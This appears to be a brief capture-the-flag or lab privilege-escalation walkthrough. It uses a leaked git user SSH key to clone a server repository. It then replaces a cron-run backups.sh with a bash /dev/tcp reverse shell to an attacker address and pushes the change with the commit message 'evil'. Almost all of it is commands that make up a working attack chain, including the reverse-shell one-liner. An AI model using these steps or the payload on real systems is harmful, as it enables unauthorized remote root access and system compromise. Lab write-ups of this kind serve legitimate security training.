---
description: 'Requirements: Git User SSH Priv Key and Cronjobs'
---

# git

```
-rwxr-xr-x 1 root root 2590 Nov  5  2020 /home/git/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
[REDACTED]
-----END OPENSSH PRIVATE KEY-----

#Cronjobs

*/3 * * * * /root/git-server/backups.sh
*/2 * * * * /root/pull.sh
```

```
$ ssh -i id_rsa git@192.168.134.125 -p 43022
```

This a rsa priv key for git user and some related files in cron. Combining them?

We will access them with command line.

```
$ GIT_SSH_COMMAND='ssh -i id_rsa -p 43022 -o IdentitiesOnly=yes' git clone git@192.168.134.125:/git-server/
```

```
#Update contents of backups.sh

!#/bin/bash
0<&196;exec 196<>/dev/tcp/192.168.49.134/8080; /bin/bash <&196 >&196 2>&196
```

```
$ git add backups.sh
$ git commit -m "evil"

$ GIT_SSH_COMMAND='ssh -i ../id_rsa -p 43022' git push -u origin
```
